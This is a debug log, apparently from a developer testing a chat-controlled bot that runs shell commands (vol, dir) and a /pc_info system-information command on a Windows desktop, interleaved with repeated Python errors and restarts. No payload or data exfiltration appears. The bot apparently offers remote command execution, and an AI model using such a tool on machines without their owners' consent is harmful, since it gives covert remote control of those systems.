+2020-07-19 11:07:38 - Notice: Command /cmd vol ran
+2020-07-19 11:07:48 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:07:48 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 11:07:48 - Notice: Command /cmd vol ran
+2020-07-19 11:07:58 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:07:58 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 11:07:58 - Notice: Command /cmd vol ran
+2020-07-19 11:08:08 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:08:08 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 11:08:08 - Notice: Command /cmd vol ran
+2020-07-19 11:08:18 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:08:18 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 11:08:18 - Notice: Command /cmd vol ran
+2020-07-19 11:08:28 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:08:28 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 11:08:28 - Notice: Command /cmd vol ran
+2020-07-19 11:08:38 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:08:38 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 11:08:38 - Notice: Command /cmd vol ran
+2020-07-19 11:08:49 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:08:49 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 11:08:49 - Notice: Command /cmd vol ran
+2020-07-19 11:08:59 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:08:59 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 11:08:59 - Notice: Command /cmd vol ran
+2020-07-19 11:09:09 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:09:09 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 11:09:09 - Notice: Command /cmd vol ran
+2020-07-19 11:09:19 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:09:19 - SPAM: Details from previous error'Bot' object has no attribute 'reply_to'
+2020-07-19 11:09:19 - Notice: Command /cmd vol ran
+2020-07-19 11:14:52 - Info: Starting
+2020-07-19 11:14:52 - SUCCESS: Setup done
+2020-07-19 11:14:52 - Info: Starting
+2020-07-19 11:14:52 - SUCCESS: Started
+2020-07-19 11:14:52 - Info: Listening for commands on DESKTOP-U15DJ5J...
+2020-07-19 11:14:52 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:14:52 - SPAM: Details from previous errorlocal variable 're' referenced before assignment
+2020-07-19 11:14:52 - Notice: Command /cmd vol ran
+2020-07-19 11:15:02 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:15:02 - SPAM: Details from previous errorlocal variable 're' referenced before assignment
+2020-07-19 11:15:02 - Notice: Command /cmd vol ran
+2020-07-19 11:15:12 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:15:12 - SPAM: Details from previous errorlocal variable 're' referenced before assignment
+2020-07-19 11:15:12 - Notice: Command /cmd vol ran
+2020-07-19 11:15:22 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:15:22 - SPAM: Details from previous errorlocal variable 're' referenced before assignment
+2020-07-19 11:15:22 - Notice: Command /cmd vol ran
+2020-07-19 11:15:32 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:15:32 - SPAM: Details from previous errorlocal variable 're' referenced before assignment
+2020-07-19 11:15:32 - Notice: Command /cmd vol ran
+2020-07-19 11:15:44 - Info: Starting
+2020-07-19 11:15:44 - SUCCESS: Setup done
+2020-07-19 11:15:44 - Info: Starting
+2020-07-19 11:15:44 - SUCCESS: Started
+2020-07-19 11:15:44 - Info: Listening for commands on DESKTOP-U15DJ5J...
+2020-07-19 11:15:44 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:15:44 - SPAM: Details from previous errorlocal variable 're' referenced before assignment
+2020-07-19 11:15:44 - Notice: Command /cmd vol ran
+2020-07-19 11:15:54 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:15:54 - SPAM: Details from previous errorlocal variable 're' referenced before assignment
+2020-07-19 11:15:54 - Notice: Command /cmd vol ran
+2020-07-19 11:16:04 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:16:04 - SPAM: Details from previous errorlocal variable 're' referenced before assignment
+2020-07-19 11:16:04 - Notice: Command /cmd vol ran
+2020-07-19 11:16:14 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:16:14 - SPAM: Details from previous errorlocal variable 're' referenced before assignment
+2020-07-19 11:16:14 - Notice: Command /cmd vol ran
+2020-07-19 11:16:24 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:16:24 - SPAM: Details from previous errorlocal variable 're' referenced before assignment
+2020-07-19 11:16:24 - Notice: Command /cmd vol ran
+2020-07-19 11:16:34 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:16:34 - SPAM: Details from previous errorlocal variable 're' referenced before assignment
+2020-07-19 11:16:34 - Notice: Command /cmd vol ran
+2020-07-19 11:16:45 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:16:45 - SPAM: Details from previous errorlocal variable 're' referenced before assignment
+2020-07-19 11:16:45 - Notice: Command /cmd vol ran
+2020-07-19 11:16:55 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:16:55 - SPAM: Details from previous errorlocal variable 're' referenced before assignment
+2020-07-19 11:16:55 - Notice: Command /cmd vol ran
+2020-07-19 11:17:01 - Info: Starting
+2020-07-19 11:17:01 - SUCCESS: Setup done
+2020-07-19 11:17:01 - Info: Starting
+2020-07-19 11:17:01 - SUCCESS: Started
+2020-07-19 11:17:01 - Info: Listening for commands on DESKTOP-U15DJ5J...
+2020-07-19 11:17:02 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:17:02 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:17:02 - Notice: Command /cmd vol ran
+2020-07-19 11:17:12 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:17:12 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:17:12 - Notice: Command /cmd vol ran
+2020-07-19 11:17:22 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:17:22 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:17:22 - Notice: Command /cmd vol ran
+2020-07-19 11:17:32 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:17:32 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:17:32 - Notice: Command /cmd vol ran
+2020-07-19 11:17:42 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:17:42 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:17:42 - Notice: Command /cmd vol ran
+2020-07-19 11:17:52 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:17:52 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:17:52 - Notice: Command /cmd vol ran
+2020-07-19 11:18:02 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:18:02 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:18:02 - Notice: Command /cmd vol ran
+2020-07-19 11:18:12 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:18:12 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:18:12 - Notice: Command /cmd vol ran
+2020-07-19 11:18:22 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:18:22 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:18:22 - Notice: Command /cmd vol ran
+2020-07-19 11:18:33 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:18:33 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:18:33 - Notice: Command /cmd vol ran
+2020-07-19 11:18:43 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:18:43 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:18:43 - Notice: Command /cmd vol ran
+2020-07-19 11:18:50 - Info: Starting
+2020-07-19 11:18:50 - SUCCESS: Setup done
+2020-07-19 11:18:50 - Info: Starting
+2020-07-19 11:18:50 - SUCCESS: Started
+2020-07-19 11:18:50 - Info: Listening for commands on DESKTOP-U15DJ5J...
+2020-07-19 11:18:50 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:18:50 - SPAM: Details from previous errorlocal variable 're' referenced before assignment
+2020-07-19 11:18:50 - Notice: Command /cmd vol ran
+2020-07-19 11:19:00 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:19:00 - SPAM: Details from previous errorlocal variable 're' referenced before assignment
+2020-07-19 11:19:00 - Notice: Command /cmd vol ran
+2020-07-19 11:19:10 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:19:10 - SPAM: Details from previous errorlocal variable 're' referenced before assignment
+2020-07-19 11:19:10 - Notice: Command /cmd vol ran
+2020-07-19 11:19:20 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:19:20 - SPAM: Details from previous errorlocal variable 're' referenced before assignment
+2020-07-19 11:19:20 - Notice: Command /cmd vol ran
+2020-07-19 11:19:30 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:19:30 - SPAM: Details from previous errorlocal variable 're' referenced before assignment
+2020-07-19 11:19:30 - Notice: Command /cmd vol ran
+2020-07-19 11:19:40 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:19:40 - SPAM: Details from previous errorlocal variable 're' referenced before assignment
+2020-07-19 11:19:40 - Notice: Command /cmd vol ran
+2020-07-19 11:20:09 - Info: Starting
+2020-07-19 11:20:09 - SUCCESS: Setup done
+2020-07-19 11:20:09 - Info: Starting
+2020-07-19 11:20:09 - SUCCESS: Started
+2020-07-19 11:20:09 - Info: Listening for commands on DESKTOP-U15DJ5J...
+2020-07-19 11:20:09 - Warning: BOT MISUSE: Invalid command
+2020-07-19 11:20:09 - Notice: Command /help ran
+2020-07-19 11:20:09 - Notice: Command /cmd vol ran
+2020-07-19 11:20:19 - Warning: BOT MISUSE: Invalid command
+2020-07-19 11:20:19 - Notice: Command /help ran
+2020-07-19 11:20:20 - Notice: Command /cmd vol ran
+2020-07-19 11:20:30 - Warning: BOT MISUSE: Invalid command
+2020-07-19 11:20:30 - Notice: Command /help ran
+2020-07-19 11:20:30 - Notice: Command /cmd vol ran
+2020-07-19 11:20:40 - Warning: BOT MISUSE: Invalid command
+2020-07-19 11:20:40 - Notice: Command /help ran
+2020-07-19 11:20:40 - Notice: Command /cmd vol ran
+2020-07-19 11:20:40 - Warning: BOT MISUSE: Invalid command
+2020-07-19 11:20:40 - Notice: Command /help ran
+2020-07-19 11:20:40 - Notice: Command /start ran
+2020-07-19 11:20:51 - Warning: BOT MISUSE: Invalid command
+2020-07-19 11:20:51 - Notice: Command /help ran
+2020-07-19 11:20:51 - Notice: Command /cmd vol ran
+2020-07-19 11:20:51 - Warning: BOT MISUSE: Invalid command
+2020-07-19 11:20:51 - Notice: Command /help ran
+2020-07-19 11:20:51 - Notice: Command /start ran
+2020-07-19 11:21:44 - Info: Starting
+2020-07-19 11:21:44 - SUCCESS: Setup done
+2020-07-19 11:21:44 - Info: Starting
+2020-07-19 11:21:44 - SUCCESS: Started
+2020-07-19 11:21:44 - Info: Listening for commands on DESKTOP-U15DJ5J...
+2020-07-19 11:21:44 - Warning: BOT MISUSE: Invalid command
+2020-07-19 11:21:44 - Notice: Command /help ran
+2020-07-19 11:21:45 - Notice: Command /cmd vol ran
+2020-07-19 11:21:45 - Warning: BOT MISUSE: Invalid command
+2020-07-19 11:21:45 - Notice: Command /help ran
+2020-07-19 11:21:45 - Notice: Command /start ran
+2020-07-19 11:21:55 - Warning: BOT MISUSE: Invalid command
+2020-07-19 11:21:55 - Notice: Command /help ran
+2020-07-19 11:21:55 - Notice: Command /cmd vol ran
+2020-07-19 11:21:55 - Warning: BOT MISUSE: Invalid command
+2020-07-19 11:21:55 - Notice: Command /help ran
+2020-07-19 11:21:55 - Notice: Command /start ran
+2020-07-19 11:22:06 - Warning: BOT MISUSE: Invalid command
+2020-07-19 11:22:06 - Notice: Command /help ran
+2020-07-19 11:22:06 - Notice: Command /cmd vol ran
+2020-07-19 11:22:06 - Warning: BOT MISUSE: Invalid command
+2020-07-19 11:22:06 - Notice: Command /help ran
+2020-07-19 11:22:06 - Notice: Command /start ran
+2020-07-19 11:23:38 - Info: Starting
+2020-07-19 11:23:38 - SUCCESS: Setup done
+2020-07-19 11:23:38 - Info: Starting
+2020-07-19 11:23:38 - SUCCESS: Started
+2020-07-19 11:23:38 - Info: Listening for commands on DESKTOP-U15DJ5J...
+2020-07-19 11:23:39 - Warning: BOT MISUSE: Invalid command
+2020-07-19 11:23:39 - Notice: Command /help ran
+2020-07-19 11:23:39 - Notice: Command /cmd vol ran
+2020-07-19 11:23:39 - Warning: BOT MISUSE: Invalid command
+2020-07-19 11:23:39 - Notice: Command /help ran
+2020-07-19 11:23:39 - Notice: Command /start ran
+2020-07-19 11:23:49 - Warning: BOT MISUSE: Invalid command
+2020-07-19 11:23:49 - Notice: Command /help ran
+2020-07-19 11:23:50 - Notice: Command /cmd vol ran
+2020-07-19 11:23:50 - Warning: BOT MISUSE: Invalid command
+2020-07-19 11:23:50 - Notice: Command /help ran
+2020-07-19 11:23:50 - Notice: Command /start ran
+2020-07-19 11:24:00 - Warning: BOT MISUSE: Invalid command
+2020-07-19 11:24:00 - Notice: Command /help ran
+2020-07-19 11:24:00 - Notice: Command /cmd vol ran
+2020-07-19 11:24:00 - Warning: BOT MISUSE: Invalid command
+2020-07-19 11:24:00 - Notice: Command /help ran
+2020-07-19 11:24:00 - Notice: Command /start ran
+2020-07-19 11:24:10 - Warning: BOT MISUSE: Invalid command
+2020-07-19 11:24:10 - Notice: Command /help ran
+2020-07-19 11:24:11 - Notice: Command /start ran
+2020-07-19 11:26:01 - Warning: BOT MISUSE: Invalid command
+2020-07-19 11:26:01 - Notice: Command /help ran
+2020-07-19 11:26:02 - Notice: Command /start ran
+2020-07-19 11:26:02 - Warning: Command exec prep
+2020-07-19 11:26:02 - Warning: Executing the command  vol
+2020-07-19 11:26:02 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:26:02 - SPAM: Details from previous errorstring argument without an encoding
+2020-07-19 11:26:02 - Notice: Command  vol ran
+2020-07-19 11:26:12 - Warning: BOT MISUSE: Invalid command
+2020-07-19 11:26:12 - Notice: Command /help ran
+2020-07-19 11:26:12 - Notice: Command /start ran
+2020-07-19 11:26:12 - Warning: Command exec prep
+2020-07-19 11:26:12 - Warning: Executing the command  vol
+2020-07-19 11:26:12 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:26:12 - SPAM: Details from previous errorstring argument without an encoding
+2020-07-19 11:26:12 - Notice: Command  vol ran
+2020-07-19 11:26:22 - Warning: BOT MISUSE: Invalid command
+2020-07-19 11:26:22 - Notice: Command /help ran
+2020-07-19 11:26:22 - Notice: Command /start ran
+2020-07-19 11:26:22 - Warning: Command exec prep
+2020-07-19 11:26:22 - Warning: Executing the command  vol
+2020-07-19 11:26:22 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:26:22 - SPAM: Details from previous errorstring argument without an encoding
+2020-07-19 11:26:22 - Notice: Command  vol ran
+2020-07-19 11:26:33 - Warning: BOT MISUSE: Invalid command
+2020-07-19 11:26:33 - Notice: Command /help ran
+2020-07-19 11:26:33 - Notice: Command /start ran
+2020-07-19 11:26:33 - Warning: Command exec prep
+2020-07-19 11:26:33 - Warning: Executing the command  vol
+2020-07-19 11:26:33 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:26:33 - SPAM: Details from previous errorstring argument without an encoding
+2020-07-19 11:26:33 - Notice: Command  vol ran
+2020-07-19 11:26:43 - Warning: BOT MISUSE: Invalid command
+2020-07-19 11:26:43 - Notice: Command /help ran
+2020-07-19 11:26:43 - Notice: Command /start ran
+2020-07-19 11:26:43 - Warning: Command exec prep
+2020-07-19 11:26:43 - Warning: Executing the command  vol
+2020-07-19 11:26:43 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:26:43 - SPAM: Details from previous errorstring argument without an encoding
+2020-07-19 11:26:43 - Notice: Command  vol ran
+2020-07-19 11:26:53 - Warning: BOT MISUSE: Invalid command
+2020-07-19 11:26:53 - Notice: Command /help ran
+2020-07-19 11:26:54 - Notice: Command /start ran
+2020-07-19 11:26:54 - Warning: Command exec prep
+2020-07-19 11:26:54 - Warning: Executing the command  vol
+2020-07-19 11:26:54 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:26:54 - SPAM: Details from previous errorstring argument without an encoding
+2020-07-19 11:26:54 - Notice: Command  vol ran
+2020-07-19 11:27:04 - Warning: BOT MISUSE: Invalid command
+2020-07-19 11:27:04 - Notice: Command /help ran
+2020-07-19 11:27:04 - Notice: Command /start ran
+2020-07-19 11:27:04 - Warning: Command exec prep
+2020-07-19 11:27:04 - Warning: Executing the command  vol
+2020-07-19 11:27:04 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:27:04 - SPAM: Details from previous errorstring argument without an encoding
+2020-07-19 11:27:04 - Notice: Command  vol ran
+2020-07-19 11:28:36 - Warning: BOT MISUSE: Invalid command
+2020-07-19 11:28:36 - Notice: Command /help ran
+2020-07-19 11:28:36 - Notice: Command /start ran
+2020-07-19 11:28:37 - Notice: Command /pc_info ran
+2020-07-19 11:28:47 - Warning: BOT MISUSE: Invalid command
+2020-07-19 11:28:47 - Notice: Command /help ran
+2020-07-19 11:28:47 - Notice: Command /start ran
+2020-07-19 11:28:48 - Notice: Command /pc_info ran
+2020-07-19 11:28:58 - Warning: BOT MISUSE: Invalid command
+2020-07-19 11:28:58 - Notice: Command /help ran
+2020-07-19 11:28:58 - Notice: Command /start ran
+2020-07-19 11:28:58 - Notice: Command /pc_info ran
+2020-07-19 11:29:09 - Warning: BOT MISUSE: Invalid command
+2020-07-19 11:29:09 - Notice: Command /help ran
+2020-07-19 11:29:09 - Notice: Command /start ran
+2020-07-19 11:29:09 - Notice: Command /pc_info ran
+2020-07-19 11:29:20 - Warning: BOT MISUSE: Invalid command
+2020-07-19 11:29:20 - Notice: Command /help ran
+2020-07-19 11:29:20 - Notice: Command /start ran
+2020-07-19 11:29:20 - Notice: Command /pc_info ran
+2020-07-19 11:29:31 - Warning: BOT MISUSE: Invalid command
+2020-07-19 11:29:31 - Notice: Command /help ran
+2020-07-19 11:29:31 - Notice: Command /start ran
+2020-07-19 11:29:31 - Notice: Command /pc_info ran
+2020-07-19 11:29:42 - Warning: BOT MISUSE: Invalid command
+2020-07-19 11:29:42 - Notice: Command /help ran
+2020-07-19 11:29:42 - Notice: Command /start ran
+2020-07-19 11:29:42 - Notice: Command /pc_info ran
+2020-07-19 11:29:53 - Warning: BOT MISUSE: Invalid command
+2020-07-19 11:29:53 - Notice: Command /help ran
+2020-07-19 11:29:53 - Notice: Command /start ran
+2020-07-19 11:29:54 - Notice: Command /pc_info ran
+2020-07-19 11:30:04 - Warning: BOT MISUSE: Invalid command
+2020-07-19 11:30:04 - Notice: Command /help ran
+2020-07-19 11:30:05 - Notice: Command /start ran
+2020-07-19 11:30:05 - Notice: Command /pc_info ran
+2020-07-19 11:30:15 - Warning: BOT MISUSE: Invalid command
+2020-07-19 11:30:15 - Notice: Command /help ran
+2020-07-19 11:30:16 - Notice: Command /start ran
+2020-07-19 11:30:16 - Notice: Command /pc_info ran
+2020-07-19 11:32:56 - Info: Starting
+2020-07-19 11:32:56 - SUCCESS: Setup done
+2020-07-19 11:32:56 - Info: Starting
+2020-07-19 11:32:56 - SUCCESS: Started
+2020-07-19 11:32:56 - Info: Listening for commands on DESKTOP-U15DJ5J...
+2020-07-19 11:32:56 - Notice: Command /start ran
+2020-07-19 11:32:57 - Notice: Command /pc_info ran
+2020-07-19 11:32:57 - Notice: Command /start ran
+2020-07-19 11:33:07 - Notice: Command /start ran
+2020-07-19 11:33:07 - Notice: Command /pc_info ran
+2020-07-19 11:33:07 - Notice: Command /start ran
+2020-07-19 11:33:17 - Notice: Command /start ran
+2020-07-19 11:33:17 - Notice: Command /pc_info ran
+2020-07-19 11:33:18 - Notice: Command /start ran
+2020-07-19 11:35:38 - Warning: Command exec prep
+2020-07-19 11:35:38 - Warning: Executing the command  dir
+2020-07-19 11:35:38 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:35:38 - SPAM: Details from previous errorstring argument without an encoding
+2020-07-19 11:35:38 - Notice: Command  dir ran
+2020-07-19 11:35:49 - Warning: Command exec prep
+2020-07-19 11:35:49 - Warning: Executing the command  dir
+2020-07-19 11:35:49 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:35:49 - SPAM: Details from previous errorstring argument without an encoding
+2020-07-19 11:35:49 - Notice: Command  dir ran
+2020-07-19 11:35:59 - Warning: Command exec prep
+2020-07-19 11:35:59 - Warning: Executing the command  dir
+2020-07-19 11:35:59 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:35:59 - SPAM: Details from previous errorstring argument without an encoding
+2020-07-19 11:35:59 - Notice: Command  dir ran
+2020-07-19 11:36:09 - Warning: Command exec prep
+2020-07-19 11:36:09 - Warning: Executing the command  dir
+2020-07-19 11:36:09 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:36:09 - SPAM: Details from previous errorstring argument without an encoding
+2020-07-19 11:36:09 - Notice: Command  dir ran
+2020-07-19 11:39:50 - Info: Starting
+2020-07-19 11:39:50 - SUCCESS: Setup done
+2020-07-19 11:39:50 - Info: Starting
+2020-07-19 11:39:50 - SUCCESS: Started
+2020-07-19 11:39:50 - Info: Listening for commands on DESKTOP-U15DJ5J...
+2020-07-19 11:39:50 - Warning: Command exec prep
+2020-07-19 11:39:50 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:39:50 - SPAM: Details from previous error[WinError 2] The system cannot find the file specified
+2020-07-19 11:39:50 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:40:00 - Warning: Command exec prep
+2020-07-19 11:40:00 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:40:00 - SPAM: Details from previous error[WinError 2] The system cannot find the file specified
+2020-07-19 11:40:00 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:40:10 - Warning: Command exec prep
+2020-07-19 11:40:10 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:40:10 - SPAM: Details from previous error[WinError 2] The system cannot find the file specified
+2020-07-19 11:40:10 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:40:20 - Warning: Command exec prep
+2020-07-19 11:40:20 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:40:20 - SPAM: Details from previous error[WinError 2] The system cannot find the file specified
+2020-07-19 11:40:20 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:40:31 - Warning: Command exec prep
+2020-07-19 11:40:31 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:40:31 - SPAM: Details from previous error[WinError 2] The system cannot find the file specified
+2020-07-19 11:40:31 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:40:41 - Warning: Command exec prep
+2020-07-19 11:40:41 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:40:41 - SPAM: Details from previous error[WinError 2] The system cannot find the file specified
+2020-07-19 11:40:41 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:40:51 - Warning: Command exec prep
+2020-07-19 11:40:51 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:40:51 - SPAM: Details from previous error[WinError 2] The system cannot find the file specified
+2020-07-19 11:40:51 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:41:01 - Warning: Command exec prep
+2020-07-19 11:41:01 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:41:01 - SPAM: Details from previous error[WinError 2] The system cannot find the file specified
+2020-07-19 11:41:01 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:41:11 - Warning: Command exec prep
+2020-07-19 11:41:11 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:41:11 - SPAM: Details from previous error[WinError 2] The system cannot find the file specified
+2020-07-19 11:41:11 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:42:07 - Info: Starting
+2020-07-19 11:42:07 - SUCCESS: Setup done
+2020-07-19 11:42:07 - Info: Starting
+2020-07-19 11:42:07 - SUCCESS: Started
+2020-07-19 11:42:07 - Info: Listening for commands on DESKTOP-U15DJ5J...
+2020-07-19 11:42:07 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:42:07 - SPAM: Details from previous errorlocal variable 're' referenced before assignment
+2020-07-19 11:42:07 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:42:17 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:42:17 - SPAM: Details from previous errorlocal variable 're' referenced before assignment
+2020-07-19 11:42:17 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:42:27 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:42:27 - SPAM: Details from previous errorlocal variable 're' referenced before assignment
+2020-07-19 11:42:27 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:42:37 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:42:37 - SPAM: Details from previous errorlocal variable 're' referenced before assignment
+2020-07-19 11:42:37 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:42:47 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:42:47 - SPAM: Details from previous errorlocal variable 're' referenced before assignment
+2020-07-19 11:42:47 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:42:57 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:42:57 - SPAM: Details from previous errorlocal variable 're' referenced before assignment
+2020-07-19 11:42:57 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:43:06 - Info: Starting
+2020-07-19 11:43:06 - SUCCESS: Setup done
+2020-07-19 11:43:06 - Info: Starting
+2020-07-19 11:43:06 - SUCCESS: Started
+2020-07-19 11:43:06 - Info: Listening for commands on DESKTOP-U15DJ5J...
+2020-07-19 11:43:07 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:43:07 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:43:07 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:43:17 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:43:17 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:43:17 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:43:27 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:43:27 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:43:27 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:43:37 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:43:37 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:43:37 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:43:47 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:43:47 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:43:47 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:43:57 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:43:57 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:43:57 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:44:07 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:44:07 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:44:07 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:44:17 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:44:17 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:44:17 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:44:26 - Info: Starting
+2020-07-19 11:44:26 - SUCCESS: Setup done
+2020-07-19 11:44:26 - Info: Starting
+2020-07-19 11:44:26 - SUCCESS: Started
+2020-07-19 11:44:26 - Info: Listening for commands on DESKTOP-U15DJ5J...
+2020-07-19 11:44:26 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:44:36 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:44:46 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:44:57 - Notice: Command /cmd_exec dir ran
+2020-07-19 11:47:35 - Info: Starting
+2020-07-19 11:47:35 - SUCCESS: Setup done
+2020-07-19 11:47:35 - Info: Starting
+2020-07-19 11:47:35 - SUCCESS: Started
+2020-07-19 11:47:35 - Info: Listening for commands on DESKTOP-U15DJ5J...
+2020-07-19 11:47:35 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 11:47:35 - SPAM: Details from previous errorname 'STDOUT' is not defined
+2020-07-19 11:47:35 - Notice: Command /cmd_exec dir ran
